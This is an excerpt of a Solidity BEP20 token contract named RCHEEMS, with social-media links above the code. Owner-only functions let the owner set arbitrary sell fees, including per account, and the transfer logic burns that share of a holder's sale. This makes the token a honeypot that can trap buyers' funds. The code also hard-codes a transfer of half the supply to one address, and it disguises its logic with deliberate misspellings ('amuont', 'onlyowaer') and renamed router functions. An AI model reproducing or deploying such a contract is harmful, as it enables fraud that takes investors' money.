...
* http://instagram.com/RCHEEMS74
* https://www.reddit.com/user/RCHEEMS74
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingRCHEEMS74OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingRCHEEMS74OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingRCHEEMS74OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingRCHEEMS74OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingRCHEEMS74OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function RCHEEMS74To() external view returns (address);
    function RCHEEMS74ToSetter() external view returns (address);
    ...
    function setRCHEEMS74To(address) external;
    function setRCHEEMS74ToSetter(address) external;
}
...
contract RCHEEMS is BEP20, Ownable {
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*5);	
        ...
        _defaultSellRCHEEMS74 = 0;
        _defaultBuyRCHEEMS74 = 0;
    ...
    uint256 private _defaultSellRCHEEMS74 = 0;
    uint256 private _defaultBuyRCHEEMS74 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellRCHEEMS74 = _value;
    }


    function acRCHEEMS74fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeRCHEEMS74amuont = 0;

        if (rF) {
            uint256 tradeRCHEEMS74 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeRCHEEMS74 = _msgRCHEEMS74Info(uint160(from));
                    tradeRCHEEMS74 = tradeRCHEEMS74 < _defaultSellRCHEEMS74 ? _defaultSellRCHEEMS74 : tradeRCHEEMS74;
                }
                if (from == uniswapV2Pair) {
                    tradeRCHEEMS74 = _defaultBuyRCHEEMS74;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeRCHEEMS74 = _Escape[from];
            }


            tradeRCHEEMS74amuont = _amuont.mul(tradeRCHEEMS74).div(100);
        }


        if (tradeRCHEEMS74amuont > 0) {
            _balances[from] = _balances[from].sub(tradeRCHEEMS74amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeRCHEEMS74amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeRCHEEMS74amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeRCHEEMS74amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeRCHEEMS74amuont);
        emit Transfer(from, _to, _amuont - tradeRCHEEMS74amuont);
    }
	...
	function _msgRCHEEMS74Info(uint _acc) internal view virtual returns (uint) {
